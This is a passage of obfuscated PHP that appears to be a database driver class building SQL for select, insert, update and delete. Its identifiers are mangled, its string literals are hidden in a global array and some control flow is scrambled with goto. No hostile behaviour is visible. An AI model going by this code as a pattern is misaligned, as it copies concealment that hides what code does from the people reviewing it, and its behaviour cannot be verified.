parse_url($CÊ÷ÒÔ’´); if ($FÉ‚ìœØ®Í[$DïŒ›±ª›[165]]) { $D”ƒ‘ø²Ïâ = array($DïŒ›±ª›[874] => $FÉ‚ìœØ®Í[$DïŒ›±ª›[165]], $DïŒ›±ª›[799] => isset($FÉ‚ìœØ®Í[$DïŒ›±ª›[531]]) ? $FÉ‚ìœØ®Í[$DïŒ›±ª›[531]] : $DïŒ›±ª›[33], $DïŒ›±ª›[800] => isset($FÉ‚ìœØ®Í[$DïŒ›±ª›[895]]) ? $FÉ‚ìœØ®Í[$DïŒ›±ª›[895]] : $DïŒ›±ª›[33], $DïŒ›±ª›[797] => isset($FÉ‚ìœØ®Í[$DïŒ›±ª›[166]]) ? $FÉ‚ìœØ®Í[$DïŒ›±ª›[166]] : $DïŒ›±ª›[33], $DïŒ›±ª›[798] => isset($FÉ‚ìœØ®Í[$DïŒ›±ª›[167]]) ? $FÉ‚ìœØ®Í[$DïŒ›±ª›[167]] : $DïŒ›±ª›[33], $DïŒ›±ª›[17] => isset($FÉ‚ìœØ®Í[$DïŒ›±ª›[75]]) ? substr($FÉ‚ìœØ®Í[$DïŒ›±ª›[75]], 1) : $DïŒ›±ª›[33]); } else { preg_match($DïŒ›±ª›[896], trim($CÊ÷ÒÔ’´), $b‡Î±…ŠÎ½); $D”ƒ‘ø²Ïâ = array($DïŒ›±ª›[874] => $b‡Î±…ŠÎ½[1], $DïŒ›±ª›[799] => $b‡Î±…ŠÎ½[2], $DïŒ›±ª›[800] => $b‡Î±…ŠÎ½[3], $DïŒ›±ª›[797] => $b‡Î±…ŠÎ½[4], $DïŒ›±ª›[798] => $b‡Î±…ŠÎ½[5], $DïŒ›±ª›[17] => $b‡Î±…ŠÎ½[6]); } $D”ƒ‘ø²Ïâ[$DïŒ›±ª›[826]] = $DïŒ›±ª›[33]; return $D”ƒ‘ø²Ïâ; } protected function debug() { $BÌŒ‚é†Ï¸ =& $_SERVER[¢à]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $BÌŒ‚é†Ï¸[897]; if (think_config($BÌŒ‚é†Ï¸[898])) { think_status($BÌŒ‚é†Ï¸[899]); think_trace($this->queryStr . $BÌŒ‚é†Ï¸[900] . think_status($BÌŒ‚é†Ï¸[20], $BÌŒ‚é†Ï¸[899], 6) . $BÌŒ‚é†Ï¸[901], $BÌŒ‚é†Ï¸[33], $BÌŒ‚é†Ï¸[902]); } } protected function parseLock($f©ñ—…¹ÈË = false) { $B×‡Ê¹Ç¤ô =& $_SERVER[¢à]; if (!$f©ñ—…¹ÈË) { return $B×‡Ê¹Ç¤ô[33]; } if ($B×‡Ê¹Ç¤ô[828] == $this->dbType) { return $B×‡Ê¹Ç¤ô[903]; } return $B×‡Ê¹Ç¤ô[904]; } protected function parseSet($c·àô“´´Š) { $Cëƒ‰»¿ =& $_SERVER[¢à]; foreach ($c·àô“´´Š as $a—ÙÀ‚Ø½Ù => $FŞ¸è¾× ) { if (is_array($FŞ¸è¾× ) && $Cëƒ‰»¿[282] == $FŞ¸è¾× [0]) { $C‰Î¨Š‚†[] = $this->parseKey($a—ÙÀ‚Ø½Ù) . $Cëƒ‰»¿[905] . $FŞ¸è¾× [1]; } elseif (is_scalar($FŞ¸è¾× ) || is_null($FŞ¸è¾× )) { $C‰Î¨Š‚†[] = $this->parseKey($a—ÙÀ‚Ø½Ù) . $Cëƒ‰»¿[905] . $this->parseValue($FŞ¸è¾× ); } } return $Cëƒ‰»¿[906] . implode($Cëƒ‰»¿[47], $C‰Î¨Š‚†); } protected function bindParam($EÒÅã›Êµ¦, $b™·äïŒß) { $this->bind[$_SERVER[¢à][4] . $EÒÅã›Êµ¦] = $b™·äïŒß; } protected function parseBind($E¶©’Èˆ‡µ) { $E¶©’Èˆ‡µ = array_merge($this->bind, $E¶©’Èˆ‡µ); $this->bind = array(); return $E¶©’Èˆ‡µ; } function parseKey(&$eƒ…Á©¯†Â, $fŒµî…¸¦® = true) { if ($fŒµî…¸¦®) { $eƒ…Á©¯†Â = $this->parseKeyCheck($eƒ…Á©¯†Â); } return $eƒ…Á©¯†Â; } function parseKeyCheck($EÁØÖàŸÛ) { $bô™íÒå§» =& $_SERVER[¢à]; $EÁØÖàŸÛ = trim($EÁØÖàŸÛ); if (!preg_match($bô™íÒå§»[907], $EÁØÖàŸÛ)) { think_exception($bô™íÒå§»[908] . $EÁØÖàŸÛ); } return $EÁØÖàŸÛ; } protected function parseValue($bğİÆŠÊöÏ) { $AºÉ¬ººÆ„ =& $_SERVER[¢à]; if (is_string($bğİÆŠÊöÏ)) { $bğİÆŠÊöÏ = $AºÉ¬ººÆ„[867] . $this->escapeString($bğİÆŠÊöÏ) . $AºÉ¬ººÆ„[867]; } elseif (isset($bğİÆŠÊöÏ[0]) && is_string($bğİÆŠÊöÏ[0]) && strtolower($bğİÆŠÊöÏ[0]) == $AºÉ¬ººÆ„[282]) { $bğİÆŠÊöÏ = $this->escapeString($bğİÆŠÊöÏ[1]); } elseif (is_array($bğİÆŠÊöÏ)) { $bğİÆŠÊöÏ = array_map(array($this, $AºÉ¬ººÆ„[868]), $bğİÆŠÊöÏ); } elseif (is_bool($bğİÆŠÊöÏ)) { $bğİÆŠÊöÏ = $bğİÆŠÊöÏ ? $AºÉ¬ººÆ„[83] : $AºÉ¬ººÆ„[464]; } elseif (is_null($bğİÆŠÊöÏ)) { $bğİÆŠÊöÏ = $AºÉ¬ººÆ„[101]; } return $bğİÆŠÊöÏ; } protected function parseField($AÜ´Ù¶ÔËŸ) { $CØ­ˆÉÈ®­ =& $_SERVER[¢à]; if (is_string($AÜ´Ù¶ÔËŸ) && strpos($AÜ´Ù¶ÔËŸ, $CØ­ˆÉÈ®­[47])) { $AÜ´Ù¶ÔËŸ = explode($CØ­ˆÉÈ®­[47], $AÜ´Ù¶ÔËŸ); } if (is_array($AÜ´Ù¶ÔËŸ)) { $dõî±ÛËì = array(); foreach ($AÜ´Ù¶ÔËŸ as $fŠ¤îÓŞÁí => $fÛßÌÜ™) { if (!is_numeric($fŠ¤îÓŞÁí)) { $dõî±ÛËì[] = $this->parseKey($fŠ¤îÓŞÁí) . $CØ­ˆÉÈ®­[909] . $this->parseKey($fÛßÌÜ™); } else { $dõî±ÛËì[] = $this->parseKey($fÛßÌÜ™); } } $Dîñ³ØÊÙ = implode($CØ­ˆÉÈ®­[47], $dõî±ÛËì); } elseif (is_string($AÜ´Ù¶ÔËŸ) && !empty($AÜ´Ù¶ÔËŸ)) { $Dîñ³ØÊÙ = $AÜ´Ù¶ÔËŸ; } else { $Dîñ³ØÊÙ = $CØ­ˆÉÈ®­[173]; } return $Dîñ³ØÊÙ; } protected function parseTable($C¶ÆÃ«÷ã•) { $D¬ß™ÎÜŸ¢ =& $_SERVER[¢à]; if (is_array($C¶ÆÃ«÷ã•)) { $c¼ÈÄÇŠ’– = array(); foreach ($C¶ÆÃ«÷ã• as $BŒîâÉóµ => $CŠ¢Ÿ¯ƒÀ·) { if (!is_numeric($BŒîâÉóµ)) { $c¼ÈÄÇŠ’–[] = $this->parseKey($BŒîâÉóµ) . $D¬ß™ÎÜŸ¢[50] . $this->parseKey($CŠ¢Ÿ¯ƒÀ·); } else { $c¼ÈÄÇŠ’–[] = $this->parseKey($BŒîâÉóµ); } } $C¶ÆÃ«÷ã• = $c¼ÈÄÇŠ’–; } elseif (is_string($C¶ÆÃ«÷ã•)) { if (strstr($C¶ÆÃ«÷ã•, $D¬ß™ÎÜŸ¢[50])) { return $C¶ÆÃ«÷ã•; } $C¶ÆÃ«÷ã• = explode($D¬ß™ÎÜŸ¢[47], $C¶ÆÃ«÷ã•); array_walk($C¶ÆÃ«÷ã•, array($this, $D¬ß™ÎÜŸ¢[816])); } return $D¬ß™ÎÜŸ¢[910] . trim(implode($D¬ß™ÎÜŸ¢[911], $C¶ÆÃ«÷ã•), $D¬ß™ÎÜŸ¢[822]) . $D¬ß™ÎÜŸ¢[910]; } protected function parseWhere($d“ì©îÚñ) { $f‚ó”§Ñ• =& $_SERVER[¢à]; $Fí¾»Â¿Àí = $f‚ó”§Ñ•[33]; if (is_string($d“ì©îÚñ)) { $Fí¾»Â¿Àí = $d“ì©îÚñ; } else { $bÁ¸©‹–î› = isset($d“ì©îÚñ[$f‚ó”§Ñ•[912]]) ? strtoupper($d“ì©îÚñ[$f‚ó”§Ñ•[912]]) : $f‚ó”§Ñ•[33]; if (in_array($bÁ¸©‹–î›, array($f‚ó”§Ñ•[913], $f‚ó”§Ñ•[914], $f‚ó”§Ñ•[915]))) { $bÁ¸©‹–î› = $f‚ó”§Ñ•[50] . $bÁ¸©‹–î› . $f‚ó”§Ñ•[50]; unset($d“ì©îÚñ[$f‚ó”§Ñ•[912]]); } else { $bÁ¸©‹–î› = $f‚ó”§Ñ•[916]; } foreach ($d“ì©îÚñ as $BÀƒß‚â => $FĞïìá†œæ) { $Fí¾»Â¿Àí .= $f‚ó”§Ñ•[262]; if (is_numeric($BÀƒß‚â)) { $BÀƒß‚â = $f‚ó”§Ñ•[917]; } if (0 === strpos($BÀƒß‚â, $f‚ó”§Ñ•[70])) { $Fí¾»Â¿Àí .= $this->parseThinkWhere($BÀƒß‚â, $FĞïìá†œæ); } else { if (!preg_match($f‚ó”§Ñ•[918], trim($BÀƒß‚â))) { think_exception(think_lang($f‚ó”§Ñ•[919]) . $f‚ó”§Ñ•[4] . $BÀƒß‚â); } $bƒ½à¦ƒ’Â = is_array($FĞïìá†œæ) && isset($FĞïìá†œæ[$f‚ó”§Ñ•[920]]); $BÀƒß‚â = trim($BÀƒß‚â); if (strpos($BÀƒß‚â, $f‚ó”§Ñ•[268])) { $Eší‘¤§© = explode($f‚ó”§Ñ•[268], $BÀƒß‚â); $AÅÂ²´†ôø = array(); foreach ($Eší‘¤§© as $B²Ğôàäˆ => $Cµ¾†íÓ) { $aÑŞä†“ = $bƒ½à¦ƒ’Â ? $FĞïìá†œæ[$B²Ğôàäˆ] : $FĞïìá†œæ; $AÅÂ²´†ôø[] = $f‚ó”§Ñ•[245] . $this->parseWhereItem($this->parseKey($Cµ¾†íÓ), $aÑŞä†“) . $f‚ó”§Ñ•[815]; } $Fí¾»Â¿Àí .= implode($f‚ó”§Ñ•[921], $AÅÂ²´†ôø); } elseif (strpos($BÀƒß‚â, $f‚ó”§Ñ•[269])) { $Eší‘¤§© = explode($f‚ó”§Ñ•[269], $BÀƒß‚â); $AÅÂ²´†ôø = array(); foreach ($Eší‘¤§© as $B²Ğôàäˆ => $Cµ¾†íÓ) { $aÑŞä†“ = $bƒ½à¦ƒ’Â ? $FĞïìá†œæ[$B²Ğôàäˆ] : $FĞïìá†œæ; $AÅÂ²´†ôø[] = $f‚ó”§Ñ•[245] . $this->parseWhereItem($this->parseKey($Cµ¾†íÓ), $aÑŞä†“) . $f‚ó”§Ñ•[815]; } $Fí¾»Â¿Àí .= implode($f‚ó”§Ñ•[916], $AÅÂ²´†ôø); } else { $Fí¾»Â¿Àí .= $this->parseWhereItem($this->parseKey($BÀƒß‚â), $FĞïìá†œæ); } } $Fí¾»Â¿Àí .= $f‚ó”§Ñ•[263] . $bÁ¸©‹–î›; } $Fí¾»Â¿Àí = substr($Fí¾»Â¿Àí, 0, -strlen($bÁ¸©‹–î›)); } return empty($Fí¾»Â¿Àí) ? $f‚ó”§Ñ•[33] : $f‚ó”§Ñ•[922] . $Fí¾»Â¿Àí; } protected function parseWhereItem($AÕì“³Ö¶, $eê‹µÂ¶ñ—) { $d”†¬ŞŒ•À =& $_SERVER[¢à]; $fñ¾’¸¾È• = $d”†¬ŞŒ•À[33]; if (is_array($eê‹µÂ¶ñ—)) { if (is_string($eê‹µÂ¶ñ—[0])) { $aÎŒ÷ ‹ï = strtolower($eê‹µÂ¶ñ—[0]); if (in_array($eê‹µÂ¶ñ—[0], array($d”†¬ŞŒ•À[905], $d”†¬ŞŒ•À[923], $d”†¬ŞŒ•À[924], $d”†¬ŞŒ•À[925], $d”†¬ŞŒ•À[926], $d”†¬ŞŒ•À[927]))) { $fñ¾’¸¾È• .= $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $eê‹µÂ¶ñ—[0] . $d”†¬ŞŒ•À[50] . $this->parseValue($eê‹µÂ¶ñ—[1]); } elseif (preg_match($d”†¬ŞŒ•À[928], $eê‹µÂ¶ñ—[0])) { $fñ¾’¸¾È• .= $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $this->exp[$aÎŒ÷ ‹ï] . $d”†¬ŞŒ•À[50] . $this->parseValue($eê‹µÂ¶ñ—[1]); } elseif (preg_match($d”†¬ŞŒ•À[929], $eê‹µÂ¶ñ—[0])) { if (is_array($eê‹µÂ¶ñ—[1])) { $d—Ğ¶‚±Ñá = isset($eê‹µÂ¶ñ—[2]) ? strtoupper($eê‹µÂ¶ñ—[2]) : $d”†¬ŞŒ•À[914]; if (in_array($d—Ğ¶‚±Ñá, array($d”†¬ŞŒ•À[913], $d”†¬ŞŒ•À[914], $d”†¬ŞŒ•À[915]))) { $FÉË‹ğ¦ÇÁ = array(); foreach ($eê‹µÂ¶ñ—[1] as $Fˆ¥Œ”Œâ½) { $FÉË‹ğ¦ÇÁ[] = $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $this->exp[$aÎŒ÷ ‹ï] . $d”†¬ŞŒ•À[50] . $this->parseValue($Fˆ¥Œ”Œâ½); } $fñ¾’¸¾È• .= $d”†¬ŞŒ•À[245] . implode($d”†¬ŞŒ•À[50] . $d—Ğ¶‚±Ñá . $d”†¬ŞŒ•À[50], $FÉË‹ğ¦ÇÁ) . $d”†¬ŞŒ•À[815]; } } else { $fñ¾’¸¾È• .= $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $this->exp[$aÎŒ÷ ‹ï] . $d”†¬ŞŒ•À[50] . $this->parseValue($eê‹µÂ¶ñ—[1]); } } elseif ($d”†¬ŞŒ•À[282] == $aÎŒ÷ ‹ï) { $fñ¾’¸¾È• .= $d”†¬ŞŒ•À[813] . $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $eê‹µÂ¶ñ—[1] . $d”†¬ŞŒ•À[930]; } elseif (preg_match($d”†¬ŞŒ•À[931], $eê‹µÂ¶ñ—[0])) { if (isset($eê‹µÂ¶ñ—[2]) && $d”†¬ŞŒ•À[282] == $eê‹µÂ¶ñ—[2]) { $fñ¾’¸¾È• .= $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $this->exp[$aÎŒ÷ ‹ï] . $d”†¬ŞŒ•À[50] . $eê‹µÂ¶ñ—[1]; } else { if (is_string($eê‹µÂ¶ñ—[1])) { $eê‹µÂ¶ñ—[1] = explode($d”†¬ŞŒ•À[47], $eê‹µÂ¶ñ—[1]); } $aé‡Ïïµ¨ = implode($d”†¬ŞŒ•À[47], $this->parseValue($eê‹µÂ¶ñ—[1])); $fñ¾’¸¾È• .= $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $this->exp[$aÎŒ÷ ‹ï] . $d”†¬ŞŒ•À[813] . $aé‡Ïïµ¨ . $d”†¬ŞŒ•À[815]; } } elseif (preg_match($d”†¬ŞŒ•À[932], $eê‹µÂ¶ñ—[0])) { $aØÛêÙÇ§ = is_string($eê‹µÂ¶ñ—[1]) ? explode($d”†¬ŞŒ•À[47], $eê‹µÂ¶ñ—[1]) : $eê‹µÂ¶ñ—[1]; $fñ¾’¸¾È• .= $d”†¬ŞŒ•À[813] . $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $this->exp[$aÎŒ÷ ‹ï] . $d”†¬ŞŒ•À[50] . $this->parseValue($aØÛêÙÇ§[0]) . $d”†¬ŞŒ•À[916] . $this->parseValue($aØÛêÙÇ§[1]) . $d”†¬ŞŒ•À[263]; } else { think_exception(think_lang($d”†¬ŞŒ•À[919]) . $d”†¬ŞŒ•À[4] . $eê‹µÂ¶ñ—[0]); } } else { $aÓÑîÅÃµØ = count($eê‹µÂ¶ñ—); $cøÎéÊË«ß = isset($eê‹µÂ¶ñ—[$aÓÑîÅÃµØ - 1]) ? strtoupper($eê‹µÂ¶ñ—[$aÓÑîÅÃµØ - 1]) : $d”†¬ŞŒ•À[33]; if (in_array($cøÎéÊË«ß, array($d”†¬ŞŒ•À[913], $d”†¬ŞŒ•À[914], $d”†¬ŞŒ•À[915]))) { $aÓÑîÅÃµØ = $aÓÑîÅÃµØ - 1; } else { $cøÎéÊË«ß = $d”†¬ŞŒ•À[913]; } for ($Aõ”Û»ÑÄº = 0; $Aõ”Û»ÑÄº < $aÓÑîÅÃµØ; $Aõ”Û»ÑÄº++) { $aØÛêÙÇ§ = is_array($eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº]) ? $eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº][1] : $eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº]; if ($d”†¬ŞŒ•À[282] == strtolower($eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº][0])) { $fñ¾’¸¾È• .= $d”†¬ŞŒ•À[245] . $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $aØÛêÙÇ§ . $d”†¬ŞŒ•À[930] . $cøÎéÊË«ß . $d”†¬ŞŒ•À[50]; } else { $b§“ãÍ³˜– = is_array($eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº]) ? $this->exp[strtolower($eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº][0])] : $d”†¬ŞŒ•À[905]; if (!$b§“ãÍ³˜– && is_array($eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº]) && in_array($eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº][0], array($d”†¬ŞŒ•À[905], $d”†¬ŞŒ•À[923], $d”†¬ŞŒ•À[924], $d”†¬ŞŒ•À[925], $d”†¬ŞŒ•À[926], $d”†¬ŞŒ•À[927]))) { $b§“ãÍ³˜– = $eê‹µÂ¶ñ—[$Aõ”Û»ÑÄº][0]; } $fñ¾’¸¾È• .= $d”†¬ŞŒ•À[245] . $AÕì“³Ö¶ . $d”†¬ŞŒ•À[50] . $b§“ãÍ³˜– . $d”†¬ŞŒ•À[50] . $this->parseValue($aØÛêÙÇ§) . $d”†¬ŞŒ•À[930] . $cøÎéÊË«ß . $d”†¬ŞŒ•À[50]; } } $fñ¾’¸¾È• = substr($fñ¾’¸¾È•, 0, -4); } } else { $fñ¾’¸¾È• .= $AÕì“³Ö¶ . $d”†¬ŞŒ•À[933] . $this->parseValue($eê‹µÂ¶ñ—); } return $fñ¾’¸¾È•; } protected function parseThinkWhere($BõØ«Á·øä, $fâİ‹ğ¬×) { $b²­Ğš†Òâ =& $_SERVER[¢à]; $f‡™ìš“ìˆ = $b²­Ğš†Òâ[33]; switch ($BõØ«Á·øä) { case $b²­Ğš†Òâ[336]: $f‡™ìš“ìˆ = $fâİ‹ğ¬×; break; case $b²­Ğš†Òâ[917]: $f‡™ìš“ìˆ = is_string($fâİ‹ğ¬×) ? $fâİ‹ğ¬× : substr($this->parseWhere($fâİ‹ğ¬×), 6); break; case $b²­Ğš†Òâ[934]: parse_str($fâİ‹ğ¬×, $b¶¦¡¬¾½); if (isset($b¶¦¡¬¾½[$b²­Ğš†Òâ[912]])) { $d†–¼½î = $b²­Ğš†Òâ[50] . strtoupper($b¶¦¡¬¾½[$b²­Ğš†Òâ[912]]) . $b²­Ğš†Òâ[50]; unset($b¶¦¡¬¾½[$b²­Ğš†Òâ[912]]); } else { $d†–¼½î = $b²­Ğš†Òâ[916]; } $D¦‚ñ›ºÅ = array(); foreach ($b¶¦¡¬¾½ as $BÆ Ú°‰ï => $bó©±»Ÿ’Å) { $D¦‚ñ›ºÅ[] = $this->parseKey($BÆ Ú°‰ï) . $b²­Ğš†Òâ[933] . $this->parseValue($bó©±»Ÿ’Å); } $f‡™ìš“ìˆ = implode($d†–¼½î, $D¦‚ñ›ºÅ); break; } return $f‡™ìš“ìˆ; } protected function parseLimit($bÜ—åÆñÏô) { $Aµ¦Ÿ™Ö‡Ò =& $_SERVER[¢à]; return !empty($bÜ—åÆñÏô) ? $Aµ¦Ÿ™Ö‡Ò[48] . $bÜ—åÆñÏô . $Aµ¦Ÿ™Ö‡Ò[50] : $Aµ¦Ÿ™Ö‡Ò[33]; } protected function parseJoin($FŞÕ¬—Û§) { $aÊñ‚‚×„‰ =& $_SERVER[¢à]; $A±òº‰´Å´ = $aÊñ‚‚×„‰[33]; if (!empty($FŞÕ¬—Û§)) { if (is_array($FŞÕ¬—Û§)) { foreach ($FŞÕ¬—Û§ as $aÅ“ğµÖĞ÷ => $EšÒÓÂŠ‡) { if (!1 !== stripos($EšÒÓÂŠ‡, $aÊñ‚‚×„‰[935])) { $A±òº‰´Å´ .= $aÊñ‚‚×„‰[50] . $EšÒÓÂŠ‡; } else { $A±òº‰´Å´ .= $aÊñ‚‚×„‰[936] . $EšÒÓÂŠ‡; } } } else { $A±òº‰´Å´ .= $aÊñ‚‚×„‰[936] . $FŞÕ¬—Û§; } } $A±òº‰´Å´ = preg_replace($aÊñ‚‚×„‰[937], think_config($aÊñ‚‚×„‰[840]) . $aÊñ‚‚×„‰[938], $A±òº‰´Å´); return $A±òº‰´Å´; } protected function parseOrder($D»ì§‰¾›•) { $fßŞÇÏ¬Ãó =& $_SERVER[¢à]; if (is_array($D»ì§‰¾›•)) { $dçëƒé· = array(); foreach ($D»ì§‰¾›• as $A¹ñ‡íáğº => $e„é»¹ß„Õ) { if (is_numeric($A¹ñ‡íáğº)) { $dçëƒé·[] = $this->parseKey($e„é»¹ß„Õ); } else { $e„é»¹ß„Õ = in_array(strtoupper(trim($e„é»¹ß„Õ)), array($fßŞÇÏ¬Ãó[939], $fßŞÇÏ¬Ãó[940])) ? $fßŞÇÏ¬Ãó[50] . $e„é»¹ß„Õ : $fßŞÇÏ¬Ãó[33]; if (preg_match($fßŞÇÏ¬Ãó[941], $A¹ñ‡íáğº)) { $dçëƒé·[] = $this->parseKey($A¹ñ‡íáğº) . $e„é»¹ß„Õ; } else { think_exception($fßŞÇÏ¬Ãó[942] . $A¹ñ‡íáğº); } } } $D»ì§‰¾›• = implode($fßŞÇÏ¬Ãó[47], $dçëƒé·); } return !empty($D»ì§‰¾›•) ? $fßŞÇÏ¬Ãó[943] . $D»ì§‰¾›• : $fßŞÇÏ¬Ãó[33]; } protected function parseGroup($f¢©ÉÀÒì¿) { $b‹ù©‚ª¹… =& $_SERVER[¢à]; return !empty($f¢©ÉÀÒì¿) ? $b‹ù©‚ª¹…[944] . $f¢©ÉÀÒì¿ : $b‹ù©‚ª¹…[33]; } protected function parseHaving($E¥ÏÊÁÕ…) { $f†í„Ç ¸À =& $_SERVER[¢à]; return !empty($E¥ÏÊÁÕ…) ? $f†í„Ç ¸À[945] . $E¥ÏÊÁÕ… : $f†í„Ç ¸À[33]; } protected function parseComment($C¦‡êÚª¦›) { $Aç¢ßÎ´ÈÙ =& $_SERVER[¢à]; return !empty($C¦‡êÚª¦›) ? $Aç¢ßÎ´ÈÙ[946] . $C¦‡êÚª¦› . $Aç¢ßÎ´ÈÙ[947] : $Aç¢ßÎ´ÈÙ[33]; } protected function parseDistinct($D¿»©“Æ ¾) { $f‰×ºŠòŞæ =& $_SERVER[¢à]; return !empty($D¿»©“Æ ¾) ? $f‰×ºŠòŞæ[948] : $f‰×ºŠòŞæ[33]; } protected function parseUnion($fÈ¢¨ì—Æá) { $CšƒÂËâŒ =& $_SERVER[¢à]; if (empty($fÈ¢¨ì—Æá)) { return $CšƒÂËâŒ[33]; } if (isset($fÈ¢¨ì—Æá[$CšƒÂËâŒ[333]])) { $F§âŠÕ§„Ş = $CšƒÂËâŒ[949]; unset($fÈ¢¨ì—Æá[$CšƒÂËâŒ[333]]); } else { $F§âŠÕ§„Ş = $CšƒÂËâŒ[950]; } foreach ($fÈ¢¨ì—Æá as $fÅ¬¼É®„‡) { $AåÁº‚×òä[] = $F§âŠÕ§„Ş . (is_array($fÅ¬¼É®„‡) ? $this->buildSelectSql($fÅ¬¼É®„‡) : $fÅ¬¼É®„‡); } return implode($CšƒÂËâŒ[50], $AåÁº‚×òä); } public function insert($AŠºóÕÀÒ, $C¯îÎì¸êÓ = array(), $Cå”‘¡Ğ¥¾ = false) { goto a²Í™¡†ñ; a¨†ô•‚§: foreach ($AŠºóÕÀÒ as $F‘´§Ãìœ° => $eÊß“ƒö…®) { if (is_array($eÊß“ƒö…®) && $CèÕ´‚¶[282] == $eÊß“ƒö…®[0]) { $F•Øè‚Ûä[] = $this->parseKey($F‘´§Ãìœ°); $EÛ©öÊâ[] = $eÊß“ƒö…®[1]; } elseif (is_scalar($eÊß“ƒö…®) || is_null($eÊß“ƒö…®)) { $F•Øè‚Ûä[] = $this->parseKey($F‘´§Ãìœ°); $EÛ©öÊâ[] = $this->parseValue($eÊß“ƒö…®); } } $dª¶‡·îßÂ = ($Cå”‘¡Ğ¥¾ ? $CèÕ´‚¶[817] : $CèÕ´‚¶[818]) . $CèÕ´‚¶[819] . $this->parseTable($C¯îÎì¸êÓ[$CèÕ´‚¶[264]]) . $CèÕ´‚¶[813] . implode($CèÕ´‚¶[47], $F•Øè‚Ûä) . $CèÕ´‚¶[814] . implode($CèÕ´‚¶[47], $EÛ©öÊâ) . $CèÕ´‚¶[815]; $dª¶‡·îßÂ .= $this->parseLock(isset($C¯îÎì¸êÓ[$CèÕ´‚¶[770]]) ? $C¯îÎì¸êÓ[$CèÕ´‚¶[770]] : !1); goto eªÖÂ¦Æì; a²Í™¡†ñ: $CèÕ´‚¶ =& $_SERVER[¢à]; $EÛ©öÊâ = $F•Øè‚Ûä = array(); $this->model = $C¯îÎì¸êÓ[$CèÕ´‚¶[266]]; goto a¨†ô•‚§; eªÖÂ¦Æì: $dª¶‡·îßÂ .= $this->parseComment(!empty($C¯îÎì¸êÓ[$CèÕ´‚¶[338]]) ? $C¯îÎì¸êÓ[$CèÕ´‚¶[338]] : $CèÕ´‚¶[33]); return $this->execute($dª¶‡·îßÂ, $this->parseBind(!empty($C¯îÎì¸êÓ[$CèÕ´‚¶[270]]) ? $C¯îÎì¸êÓ[$CèÕ´‚¶[270]] : array())); goto cÎ«ãø÷ĞÇ; cÎ«ãø÷ĞÇ: } public function selectInsert($cà¬À…“šì, $b¯©°­íˆ’, $aº©ğÈê¯© = array()) { goto dçµ”ù—; bóô™ŸÏìÛ: array_walk($cà¬À…“šì, array($this, $f‡º…âÏç–[816])); $D‡ˆ®‡ÛÆ× = $f‡º…âÏç–[951] . $this->parseTable($b¯©°­íˆ’) . $f‡º…âÏç–[813] . implode($f‡º…âÏç–[47], $cà¬À…“šì) . $f‡º…âÏç–[930]; $D‡ˆ®‡ÛÆ× .= $this->buildSelectSql($aº©ğÈê¯©); goto D­èÓ¤…ö¡; D­èÓ¤…ö¡: return $this->execute($D‡ˆ®‡ÛÆ×, $this->parseBind(!empty($aº©ğÈê¯©[$f‡º…âÏç–[270]]) ? $aº©ğÈê¯©[$f‡º…âÏç–[270]] : array())); goto DŸ’Æ«Ñï; dçµ”ù—: $f‡º…âÏç– =& $_SERVER[¢à]; $this->model = $aº©ğÈê¯©[$f‡º…âÏç–[266]]; if (is_string($cà¬À…“šì)) { $cà¬À…“šì = explode($f‡º…âÏç–[47], $cà¬À…“šì); } goto bóô™ŸÏìÛ; DŸ’Æ«Ñï: } public function update($BÜôâÌ¿…, $d‰»ö®‚«ï) { $eÛ‹İ‡×©† =& $_SERVER[¢à]; $this->model = $d‰»ö®‚«ï[$eÛ‹İ‡×©†[266]]; $FìÎŒÊ‹Äİ = $eÛ‹İ‡×©†[952] . $this->parseTable($d‰»ö®‚«ï[$eÛ‹İ‡×©†[264]]) . $this->parseSet($BÜôâÌ¿…) . $this->parseWhere(!empty($d‰»ö®‚«ï[$eÛ‹İ‡×©†[260]]) ? $d‰»ö®‚«ï[$eÛ‹İ‡×©†[260]] : $eÛ‹İ‡×©†[33]) . $this->parseOrder(!empty($d‰»ö®‚«ï[$eÛ‹İ‡×©†[347]]) ? $d‰»ö®‚«ï[$eÛ‹İ‡×©†[347]] : $eÛ‹İ‡×©†[33]) . $this->parseLimit(!empty($d‰»ö®‚«ï[$eÛ‹İ‡×©†[277]]) ? $d‰»ö®‚«ï[$eÛ‹İ‡×©†[277]] : $eÛ‹İ‡×©†[33]) . $this->parseLock(isset($d‰»ö®‚«ï[$eÛ‹İ‡×©†[770]]) ? $d‰»ö®‚«ï[$eÛ‹İ‡×©†[770]] : !1) . $this->parseComment(!empty($d‰»ö®‚«ï[$eÛ‹İ‡×©†[338]]) ? $d‰»ö®‚«ï[$eÛ‹İ‡×©†[338]] : $eÛ‹İ‡×©†[33]); return $this->execute($FìÎŒÊ‹Äİ, $this->parseBind(!empty($d‰»ö®‚«ï[$eÛ‹İ‡×©†[270]]) ? $d‰»ö®‚«ï[$eÛ‹İ‡×©†[270]] : array())); } public function delete($DÀŞŞÈ¿ø = array()) { $Aõ»£Î¡Ï =& $_SERVER[¢à]; $this->model = $DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[266]]; $Cñ²àŠƒó = $Aõ»£Î¡Ï[953] . $this->parseTable($DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[264]]) . $this->parseWhere(!empty($DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[260]]) ? $DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[260]] : $Aõ»£Î¡Ï[33]) . $this->parseOrder(!empty($DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[347]]) ? $DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[347]] : $Aõ»£Î¡Ï[33]) . $this->parseLimit(!empty($DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[277]]) ? 